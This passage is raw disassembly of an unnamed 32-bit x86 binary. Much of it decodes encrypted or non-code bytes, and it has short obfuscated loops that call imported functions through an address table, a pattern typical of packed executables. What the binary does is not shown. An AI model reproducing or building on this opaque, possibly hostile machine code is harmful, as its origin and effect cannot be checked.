  40742b:	cmp    BYTE PTR [ebx-0x7c],ah
  40742e:	sbb    DWORD PTR [edi],edx
  407430:	pop    edx
  407431:	lea    edx,[ecx+0x43]
  407434:	sub    al,0xf2
  407436:	dec    ebp
  407437:	or     DWORD PTR [edi+0x63],ebp
  40743a:	xor    eax,esp
  40743c:	pop    ebp
  40743d:	(bad)  
  40743f:	mov    cl,0x77
  407441:	cdq    
  407442:	mov    dl,0xb5
  407444:	arpl   WORD PTR [eax-0x36107f26],cx
  40744a:	sbb    ah,bh
  40744c:	leave  
  40744d:	jl     0x40743c
  40744f:	out    dx,eax
  407450:	test   BYTE PTR [ebx],0xcf
  407453:	adc    al,0xf3
  407455:	popf   
  407456:	add    al,0xa6
  407458:	out    dx,al
  407459:	daa    
  40745a:	cli    
  40745b:	add    eax,0x81db7711
  407460:	jo     0x407457
  407462:	xor    al,0xc2
  407464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407465:	fwait
  407466:	call   0x7d75a21d
  40746b:	jne    0x407451
  40746d:	mov    ds:0x9e6ce41f,eax
  407472:	loope  0x40748b
  407474:	shl    ch,cl
  407476:	les    esp,FWORD PTR [eax+0x73]
  407479:	cs retf 0x97b2
  40747d:	pusha  
  40747e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747f:	jns    0x4074fa
  407481:	cmp    ch,BYTE PTR [esi-0x131cbd58]
  407487:	ficom  DWORD PTR [ebp+0x44]
  40748a:	outs   dx,BYTE PTR ds:[esi]
  40748b:	bound  ebx,QWORD PTR [ecx+0x74]
  40748e:	or     al,0x89
  407490:	xor    dh,BYTE PTR [edx]
  407492:	mov    dh,0x3e
  407494:	adc    DWORD PTR [eax],0xb80cfe0a
  40749a:	xor    DWORD PTR [ebp-0x6d6b4cfd],ebp
  4074a0:	call   0x34de38c9
  4074a5:	adc    al,bh
  4074a7:	mov    ah,0x7a
  4074a9:	imul   ecx,ecx,0x831b0f10
  4074af:	add    BYTE PTR [edi-0xb],dh
  4074b2:	es dec esp
  4074b4:	mov    al,ds:0x501c7dd1
  4074b9:	(bad)  
  4074ba:	or     edx,esi
  4074bc:	jnp    0x407461
  4074be:	jp     0x407491
  4074c0:	add    eax,0x4d4489a3
  4074c5:	mov    ds:0xfced783e,eax
  4074ca:	add    DWORD PTR [ebx],0xaea9d2f3
  4074d0:	cmp    al,0xfa
  4074d2:	adc    BYTE PTR [edi-0x51b44131],al
  4074d8:	mov    ds:0xcc6adccb,eax
  4074dd:	popf   
  4074de:	mov    bh,0x80
  4074e0:	sub    edi,ecx
  4074e2:	xor    ebp,DWORD PTR [edi+0x2c73f01c]
  4074e8:	sub    cl,cl
  4074ea:	pop    ebp
  4074eb:	cmc    
  4074ec:	iret   
  4074ed:	retf   0x74ef
  4074f0:	push   ds
  4074f1:	push   ecx
  4074f2:	add    DWORD PTR [edx+0x76ca74e7],ebp
  4074f8:	mov    ds:0x6ed1eff2,eax
  4074fd:	sahf   
  4074fe:	lods   eax,DWORD PTR ds:[esi]
  4074ff:	jno    0x40753f
  407501:	js     0x4074a0
  407503:	pop    eax
  407504:	(bad)  
  407505:	mov    edi,edi
  407507:	push   ecx
  407508:	jbe    0x40754f
  40750a:	pop    ds
  40750b:	add    BYTE PTR [eax+0x3ce4729],ah
  407511:	repz test BYTE PTR fs:[edx-0x53],bl
  407516:	js     0x40756b
  407518:	imul   esp,DWORD PTR [ecx+0x3ab2a835],0xa3571c37
  407522:	loopne 0x4074b4
  407524:	xchg   ebp,eax
  407525:	mov    ebx,0x93dc6ea4
  40752a:	cmp    BYTE PTR [edi],0x53
  40752d:	test   eax,0xfc881386
  407532:	adc    al,0x9d
  407534:	pop    eax
  407535:	jae    0x407585
  407537:	mov    ecx,DWORD PTR [edx-0x4a]
  40753a:	aaa    
  40753b:	sbb    ecx,DWORD PTR [eax-0x34]
  40753e:	mov    esp,0xff9b5e2c
  407543:	loop   0x4075b7
  407545:	sbb    al,0x4c
  407547:	mov    ds:0xc68f45cc,al
  40754c:	dec    edx
  40754d:	add    BYTE PTR [ecx],bl
  40754f:	ds out dx,al
  407551:	push   0xfffffff7
  407553:	lea    esi,[edi+eiz*4-0x46]
  407557:	in     eax,dx
  407558:	pop    edx
  407559:	inc    edx
  40755a:	pushf  
  40755b:	jg     0x4075c0
  40755d:	and    dl,BYTE PTR [eax+ecx*2]
  407560:	mov    ebp,0x788994fb
  407565:	shl    BYTE PTR [eax+0x4],0x52
  407569:	jg     0x407576
  40756b:	push   edx
  40756c:	adc    bh,BYTE PTR [ecx]
  40756e:	mov    ebx,0xae182ea5
  407573:	adc    BYTE PTR [edi+0x54a46d81],0xcf
  40757a:	xchg   ecx,eax
  40757b:	(bad)  
  40757d:	push   edx
  40757e:	push   ds
  40757f:	rep outs dx,BYTE PTR ds:[esi]
  407581:	and    al,0x5c
  407583:	xor    ebx,DWORD PTR [esi]
  407585:	sti    
  407586:	mov    al,0xb
  407588:	jmp    0x4075f4
  40758a:	jg     0x40756e
  40758c:	or     BYTE PTR [edx+0x5b],ch
  40758f:	iret   
  407590:	push   0xc399e1b6
  407595:	in     al,0x85
  407597:	lahf   
  407598:	mov    es,WORD PTR [edx-0x38dd281f]
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	jbe    0x407618
  407657:	ja     0x4076c9
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0xc47e7e7c
  407662:	test   eax,0xd58c4e9f
  407667:	xchg   edi,eax
  407668:	ss lahf 
  40766a:	test   DWORD PTR [ebp+ebp*8-0x19],0x5033889
  407672:	mov    cl,0x9f
  407674:	rol    DWORD PTR [ebx+0x7151fc36],1
  40767a:	jp     0x4076e5
  40767c:	inc    ebp
  40767d:	push   edx
  40767e:	mov    BYTE PTR [esi+ecx*2-0x14fefb98],dl
  407685:	mov    ds:0xf4d7846c,eax
  40768a:	mov    al,BYTE PTR [ecx-0x26a7ed5a]
  407690:	mov    ecx,0xa3d5cfd3
  407695:	retf   0x370e
  407698:	addr16 push 0x68
  40769b:	(bad)  
  40769c:	mov    ebx,0x5e1e50ec
  4076a1:	addr16 fwait
  4076a3:	mov    bl,0x67
  4076a5:	sahf   
  4076a6:	int    0x2f
  4076a8:	int    0xb0
  4076aa:	das    
  4076ab:	rol    BYTE PTR [ecx+0x2f],0x91
  4076af:	push   0x902d4880
  4076b4:	sti    
  4076b5:	push   eax
  4076b6:	rcr    BYTE PTR [ecx+0x2f],1
  4076b9:	push   0x66eea587
  4076be:	mov    WORD PTR [ecx-0x742cd2e8],fs
  4076c4:	and    BYTE PTR ds:0xd9d300a,cl
  4076ca:	sbb    DWORD PTR [ebp-0x73ca6bbd],esp
  4076d0:	out    0x73,eax
  4076d2:	cli    
  4076d3:	lock mov edi,0xd1c454d4
  4076da:	push   edi
  4076db:	lods   al,BYTE PTR ds:[esi]
  4076dc:	pop    ebp
  4076dd:	fidiv  WORD PTR [esi-0x4c]
  4076e0:	jg     0x40771f
  4076e2:	popa   
  4076e3:	mov    es,WORD PTR [edx+0x30c6dde6]
  4076e9:	mov    ds:0xb3ba50c8,al
  4076ee:	mov    eax,0xd095b60a
  4076f3:	pop    ebp
  4076f4:	sub    BYTE PTR [ecx+edx*2+0x73d71116],ch
  4076fb:	mov    ss,esi
  4076fd:	shl    DWORD PTR [ecx+0x1feabd5b],cl
  407703:	jnp    0x4076b8
  407705:	ins    BYTE PTR es:[edi],dx
  407706:	das    
  407707:	test   BYTE PTR [esi-0x1ff9a77],bl
  40770d:	push   0xffffffec
  40770f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407710:	add    bh,al
  407712:	inc    eax
  407713:	or     ebx,eax
  407715:	aam    0xb1
  407717:	imul   edi,DWORD PTR [esi-0x4],0x811fa5e5
  40771e:	push   ecx
  40771f:	push   0xffffffea
  407721:	mov    esp,0x529d5f3c
  407726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407727:	sub    bh,cl
  407729:	xor    al,0x90
  40772b:	sub    al,0xc7
  40772d:	js     0x407733
  40772f:	arpl   WORD PTR [ebx],ax
  407731:	ret    
  407732:	daa    
  407733:	dec    esp
  407734:	pop    eax
  407735:	push   edi
  407737:	dec    edx
  407738:	add    esp,ecx
  40773a:	mov    bh,0x2e
  40773c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40773d:	daa    
  40773e:	cmp    DWORD PTR [esi+0x36f295d1],esp
  407744:	bnd jge 0x407717
  407747:	clc    
  407748:	mov    ebp,ebx
  40774a:	fiadd  DWORD PTR [edi+ecx*8+0x5f]
  40774e:	cmp    dh,BYTE PTR [edi-0x2d43aa64]
  407754:	pop    esi
  407755:	mov    BYTE PTR [edi+0x75a9de2],cl
  40775b:	jo     0x4076e8
  40775d:	pop    es
  40775e:	das    
  40775f:	sbb    ah,BYTE PTR [esi+0x356da3e4]
  407765:	inc    edx
  407766:	add    eax,0x901cc57a
  40776b:	add    eax,0x61255dbb
  407770:	outs   dx,DWORD PTR ds:[esi]
  407771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407772:	retf   0x528
  407775:	inc    eax
  407776:	and    BYTE PTR [ebx+0x43],bh
  407779:	std    
  40777a:	dec    esp
  40777b:	mov    cl,0x86
  40777d:	and    eax,0x3e62772b
  407782:	mov    cl,0x4e
  407784:	xor    al,0xcc
  407786:	mov    eax,0xfc6545f6
  40778b:	adc    al,0x43
  40778d:	mov    dh,0x1b
  40778f:	inc    ebx
  407790:	xor    eax,0xe2fa5843
  407795:	and    cl,BYTE PTR [edi]
  407797:	adc    al,0x9
  407799:	das    
  40779a:	fisubr DWORD PTR [esi+ebp*1+0xf8d9b67]
  4077a1:	mov    bl,0xaa
  4077a3:	into   
  4077a4:	mov    ecx,0x28fed56b
  4077a9:	mov    eax,0x597086ac
  4077ae:	mov    esp,0xa5d185f2
  4077b3:	sbb    ch,BYTE PTR [eax+0x7cc81b1e]
  4077b9:	jae    0x407759
  4077bb:	mov    ebx,0xcd010ced
  4077c0:	ds pop ebp
  4077c2:	gs push ecx
  4077c4:	xchg   edi,eax
  4077c5:	jb     0x40775e
  4077c7:	je     0x40774d
  4077c9:	mov    esp,0x36523c
  4077ce:	ret    0xcfa0
  4077d1:	cli    
  4077d2:	test   eax,0xdbc7371e
  4077d7:	xor    ch,BYTE PTR [eax-0x18]
  4077da:	xor    BYTE PTR [edx-0x7],dl
  4077dd:	sbb    BYTE PTR [ecx-0x4c1c8a2b],ah
  4077e3:	lds    esp,FWORD PTR [ecx-0x40]
  4077e6:	mov    dh,0x61
  4077e8:	dec    edi
  4077e9:	xchg   esi,eax
  4077ea:	ja     0x4077f2
  4077ec:	add    al,0x96
  4077ee:	cmp    eax,DWORD PTR [ebp+0x10ff47a8]
  4077f4:	rol    DWORD PTR [edi-0x31],cl
  4077f7:	sti    
  4077f8:	push   ebp
  4077f9:	xchg   esp,eax
  4077fa:	push   0xffffff85
  4077fc:	inc    ecx
  4077fd:	lods   eax,DWORD PTR ds:[esi]
  4077fe:	cld    
  4077ff:	ss icebp 
  407801:	(bad)  
  407802:	es leave 
  407804:	popa   
  407805:	fdivr  st(1),st
  407807:	xor    ebx,DWORD PTR [ebx+0x4e]
  40780a:	xchg   edx,eax
  40780b:	sar    BYTE PTR [ebp+edx*4+0x25],0x32
  407810:	stc    
  407811:	push   ecx
  407812:	and    eax,0x5cf3990c
  407817:	jl     0x4077f0
  407819:	push   0xffffffdb
  40781b:	inc    esi
  40781c:	lea    esp,[esi+0x58]
  40781f:	addr16 sub edx,edx
  407822:	js     0x4077a6
  407824:	and    BYTE PTR [eax],al
  407826:	dec    BYTE PTR ds:0xab7fa447
  40782c:	shr    BYTE PTR [ecx+0x2589ded2],cl
  407832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407833:	shr    DWORD PTR [esp+ebx*1-0x525fcd9f],cl
  40783a:	sbb    bh,bl
  40783c:	jmp    0x6d3d8a21
  407841:	adc    DWORD PTR [eax],esp
  407843:	inc    ebp
  407844:	test   DWORD PTR es:[esi-0x29],eax
  407848:	add    bh,BYTE PTR [esi+0x6333df45]
  40784e:	test   al,0x8b
  407850:	jecxz  0x4077ec
  407852:	jo     0x4078b8
  407854:	push   DWORD PTR [eax]
  407856:	enter  0xb1d6,0x87
  40785a:	xor    DWORD PTR [esi-0x3872c7fa],ecx
  407860:	mov    bl,0x8e
  407862:	je     0x407817
  407864:	cmp    ebp,DWORD PTR [eiz*1+0x400796d2]
  40786b:	jnp    0x4078c3
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0xf,eax
  407922:	adc    BYTE PTR [edi+0x10],cl
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xd07e7e7c
  40792e:	inc    edx
  40792f:	or     bh,BYTE PTR [esp+ebx*2+0xa346e96]
  407936:	jmp    0x884add75
  40793b:	clc    
  40793c:	dec    edx
  40793d:	ins    DWORD PTR es:[edi],dx
  40793e:	jp     0x4078e5
  407940:	push   edx
  407941:	rcr    BYTE PTR ds:0xbbe53b3f,0x3c
  407948:	push   esi
  407949:	aas    
  40794a:	loop   0x4078e0
  40794c:	aam    0xd1
  40794e:	cmp    DWORD PTR [esp+esi*1-0x51],0x88f83a23
  407956:	xor    al,0x33
  407958:	sbb    BYTE PTR [ebx+edx*1-0x41],dl
  40795c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795d:	mov    ecx,0xb76637c4
  407962:	lahf   
  407963:	push   ebp
  407964:	popa   
  407965:	into   
  407966:	arpl   dx,ax
  407968:	dec    ecx
  407969:	mov    dl,0x17
  40796b:	pop    edi
  40796c:	push   cs
  40796d:	(bad)  
  40796e:	pusha  
  40796f:	pop    ecx
  407970:	rcr    ch,0x36
  407973:	test   eax,0x6f384705
  407978:	sub    ch,BYTE PTR [ebp-0x35b66012]
  40797e:	xchg   edx,eax
  40797f:	sar    BYTE PTR [edx+0x7d],cl
  407982:	and    DWORD PTR [ebx],edx
  407984:	or     eax,0x4702c55
  407989:	and    eax,0x84592746
  40798e:	pop    ecx
  40798f:	or     esp,DWORD PTR [ebp+0x2735453d]
  407995:	aad    0x83
  407997:	(bad)  
  407998:	sti    
  407999:	pop    eax
  40799a:	mov    ebx,0x5a39d4f6
  40799f:	repz jmp 0x407982
  4079a2:	xchg   ebx,eax
  4079a3:	iret   
  4079a4:	sahf   
  4079a5:	sbb    eax,0x676819c5
  4079aa:	mov    bh,0xcc
  4079ac:	or     eax,0xacd8f8b1
  4079b1:	jmp    0x11f0:0x62707ebf
  4079b8:	ret    
  4079b9:	mov    al,0xf7
  4079bb:	rol    DWORD PTR [edi],cl
  4079bd:	jmp    0xadb1c9cb
  4079c2:	jns    0x40796b
  4079c4:	aas    
  4079c5:	in     eax,0x10
  4079c7:	xchg   esi,eax
  4079c8:	rcl    DWORD PTR [esi-0x63],0xa9
  4079cc:	fdiv   DWORD PTR [edi]
  4079ce:	pop    edi
  4079cf:	cli    
  4079d0:	dec    ebp
  4079d1:	mov    ch,0x86
  4079d3:	loope  0x4079ca
  4079d5:	mov    cl,0x85
  4079d7:	inc    edi
  4079d8:	sbb    cl,BYTE PTR [esi-0x1d13c362]
  4079de:	jmp    0x82bf4e51
  4079e3:	sub    BYTE PTR [eax-0x64],cl
  4079e6:	xor    eax,0x360e00e1
  4079eb:	mov    edx,0x4f4e1a23
  4079f0:	test   bl,ch
  4079f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079f3:	cdq    
  4079f4:	pop    ss
  4079f5:	pusha  
  4079f6:	jo     0x407981
  4079f8:	rol    BYTE PTR fs:[edx-0x1cb7a78d],0xc3
  407a00:	pop    eax
  407a01:	adc    DWORD PTR [ebx-0x4b58de4d],esp
  407a07:	je     0x407a56
  407a09:	jne    0x407a34
  407a0b:	push   0xc641a984
  407a10:	push   0x86457feb
  407a15:	sbb    al,0x4e
  407a17:	f2xm1  
  407a19:	dec    esp
  407a1a:	cdq    
  407a1b:	mov    bl,0x6f
  407a1d:	pop    esi
  407a1e:	and    BYTE PTR [eax-0x747e7f10],al
  407a24:	ins    DWORD PTR es:[edi],dx
  407a25:	popa   
  407a26:	or     al,0x33
  407a28:	sub    BYTE PTR [ebp-0xf],bh
  407a2b:	pop    ebx
  407a2c:	jmp    0x90d0002b
  407a31:	inc    edx
  407a32:	pop    ecx
  407a33:	aad    0xcd
  407a35:	fidiv  WORD PTR [esi+0x2b]
  407a38:	mov    esp,0x5b5fbc7d
  407a3d:	adc    dl,BYTE PTR ds:0x37cb668a
  407a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a44:	(bad)  
  407a45:	jmp    DWORD PTR [ebx]
  407a47:	fsubr  DWORD PTR [esi]
  407a49:	mov    esi,0x927f9959
  407a4e:	jge    0x407a01
  407a50:	(bad)  
  407a51:	fidiv  DWORD PTR ds:0x10de1b01
  407a57:	loop   0x407a97
  407a59:	lahf   
  407a5a:	shl    DWORD PTR [ebp-0x67],0x55
  407a5e:	or     DWORD PTR [eax+0x67a5a896],edx
  407a64:	(bad)  [edi]
  407a66:	add    al,0x9
  407a68:	loopne 0x407a70
  407a6a:	dec    esp
  407a6b:	js     0x407ae2
  407a6d:	cs scas eax,DWORD PTR es:[edi]
  407a6f:	mov    edx,DWORD PTR es:0x4b9da195
  407a76:	aaa    
  407a77:	ror    al,0xa8
  407a7a:	or     BYTE PTR [eax+eax*1+0x122d5fbe],bh
  407a81:	iret   
  407a82:	mov    bh,0x6d
  407a84:	xor    DWORD PTR [edi],ebp
  407a86:	rol    DWORD PTR [ecx-0x37],0x7f
  407a8a:	arpl   WORD PTR [ebx-0x5837fbe5],di
  407a90:	adc    al,0x57
  407a92:	rcr    BYTE PTR [eax],cl
  407a94:	cmp    DWORD PTR [edx],eax
  407a96:	in     al,dx
  407a97:	test   eax,edi
  407a99:	repnz push ebp
  407a9b:	add    eax,edx
  407a9d:	scas   eax,DWORD PTR es:[edi]
  407a9e:	jl     0x407a5a
  407aa0:	jbe    0x407ab0
  407aa2:	dec    esp
  407aa3:	xchg   ebp,eax
  407aa4:	xchg   ecx,eax
  407aa5:	sahf   
  407aa6:	dec    ecx
  407aa7:	fwait
  407aa8:	ss lahf 
  407aaa:	lods   eax,DWORD PTR ds:[esi]
  407aab:	fisttp QWORD PTR [eax-0x52]
  407aae:	in     al,dx
  407aaf:	aad    0x10
  407ab1:	test   BYTE PTR [eax+0x17f59e14],dl
  407ab7:	mov    edi,0xfb607fd6
  407abc:	arpl   WORD PTR [ebx-0x31],sp
  407abf:	in     eax,0x55
  407ac1:	fnstenv [eax]
  407ac3:	repnz cmp bh,BYTE PTR [edi-0x7114abee]
  407aca:	jmp    0x657b:0xd7f57df1
  407ad1:	pushf  
  407ad2:	xchg   esp,eax
  407ad3:	cwde   
  407ad4:	and    eax,0xdd4c79eb
  407ad9:	cmp    al,0x6b
  407adb:	sbb    BYTE PTR [ecx],dh
  407add:	int3   
  407ade:	imul   edx,edx,0xffffffa0
  407ae1:	sub    DWORD PTR ds:0x7e9a16c7,0xed7623a3
  407aeb:	or     ah,bh
  407aed:	mov    al,ds:0x779686b1
  407af2:	ror    BYTE PTR [esi+ebx*2+0xf397d1f],1
  407af9:	or     DWORD PTR [ebx-0xa082297],eax
  407aff:	lahf   
  407b00:	pop    ebx
  407b01:	push   esi
  407b02:	sar    bh,cl
  407b04:	daa    
  407b05:	(bad)  
  407b06:	icebp  
  407b07:	and    edx,DWORD PTR [ebx-0x78295d3b]
  407b0d:	push   ss
  407b0e:	test   eax,0x3204ba4e
  407b13:	aam    0xb9
  407b15:	mov    edi,DWORD PTR [edi+0x6988eae0]
  407b1b:	pop    ebp
  407b1c:	pop    ebp
  407b1d:	inc    esi
  407b1e:	inc    ebp
  407b1f:	pop    esi
  407b20:	pop    ss
  407b21:	stos   DWORD PTR es:[edi],eax
  407b22:	repnz popf 
  407b24:	(bad)  
  407b25:	cdq    
  407b26:	hlt    
  407b27:	shr    BYTE PTR [ebp-0x4925f435],cl
  407b2d:	std    
  407b2e:	loop   0x407b87
  407b30:	clc    
  407b31:	pop    edi
  407b32:	and    edi,eax
  407b34:	stc    
  407b35:	inc    edi
  407b36:	pusha  
  407b37:	div    BYTE PTR [ebx]
  407b39:	rol    DWORD PTR [ecx+0x4337ab15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	pop    ebx
  407c4b:	cdq    
  407c4c:	retf   
  407c4d:	stos   DWORD PTR es:[edi],eax
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x477e7e7c
  407c57:	cmp    DWORD PTR fs:[ebp-0x23],ebx
  407c5b:	sbb    eax,0xc6c149ef
  407c60:	mov    edi,0x790fef2e
  407c65:	scas   eax,DWORD PTR es:[edi]
  407c66:	scas   eax,DWORD PTR es:[edi]
  407c67:	dec    esi
  407c68:	mov    ebp,0x59ce7c47
  407c6d:	jns    0x407bf0
  407c6f:	popf   
  407c70:	repz fisub DWORD PTR [esi-0x134a7f66]
  407c77:	fcmove st,st(2)
  407c79:	mov    gs,WORD PTR [ecx+0x4c]
  407c7c:	sbb    al,0x1d
  407c7e:	enter  0x5778,0x42
  407c82:	sub    al,0xb3
  407c84:	cmp    DWORD PTR [edi],esi
  407c86:	inc    eax
  407c87:	lods   al,BYTE PTR ds:[esi]
  407c88:	repz mov ah,0x9b
  407c8b:	dec    esp
  407c8c:	repnz push esp
  407c8e:	dec    eax
  407c8f:	stc    
  407c90:	sub    eax,0x73a35a43
  407c95:	inc    edx
  407c96:	dec    eax
  407c97:	xor    ebx,eax
  407c99:	adc    eax,DWORD PTR gs:[eax+0x40ff535c]
  407ca0:	addr16 xchg ebx,eax
  407ca2:	arpl   WORD PTR [esi],cx
  407ca4:	jno    0x407c36
  407ca6:	sub    eax,DWORD PTR [edx-0x32655c34]
  407cac:	into   
  407cad:	and    al,0xf9
  407caf:	mov    BYTE PTR [ecx+esi*4+0x5a93bd8d],bh
  407cb6:	or     bh,BYTE PTR [esi-0x39c1d04c]
  407cbc:	mov    esi,0xc8f10b46
  407cc1:	and    eax,0xd471e888
  407cc6:	repnz test eax,ebp
  407cc9:	push   0xffffffba
  407ccb:	mov    eax,0x685dc3da
  407cd0:	push   esp
  407cd1:	pop    ecx
  407cd2:	ficom  DWORD PTR [esi*2+0x167d8d82]
  407cd9:	xor    bh,BYTE PTR [edx]
  407cdb:	test   DWORD PTR [eax],ecx
  407cdd:	ret    0xcbae
  407ce0:	(bad)  
  407ce1:	dec    edi
  407ce2:	cmp    eax,0x81581cb4
  407ce7:	adc    ecx,DWORD PTR [ebx+0x64]
  407cea:	xchg   ecx,eax
  407ceb:	lea    ebp,[esi-0x2c]
  407cee:	jl     0x407d6b
  407cf0:	adc    bh,dl
  407cf2:	shr    BYTE PTR [eax],cl
  407cf4:	jno    0x407d20
  407cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cf7:	sahf   
  407cf8:	std    
  407cf9:	xchg   esi,eax
  407cfa:	ds out dx,al
  407cfc:	pop    esp
  407cfd:	inc    ebx
  407cfe:	mov    ebp,0x1d9623fe
  407d03:	push   cs
  407d04:	retf   
  407d05:	cmp    al,0x2
  407d07:	pop    ebp
  407d08:	imul   esi,DWORD PTR [edx+0x722f8409],0x64
  407d0f:	add    edi,edi
  407d11:	cmp    BYTE PTR [esi],ch
  407d13:	sti    
  407d14:	test   al,0x5b
  407d16:	xchg   DWORD PTR [ecx],ecx
  407d18:	nop
  407d19:	and    DWORD PTR [eax+0x3a],esi
  407d1c:	push   ebp
  407d1d:	mov    edx,0xa278b51c
  407d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d23:	jbe    0x407d1b
  407d25:	inc    esi
  407d26:	lods   al,BYTE PTR ds:[esi]
  407d27:	jl     0x407ccd
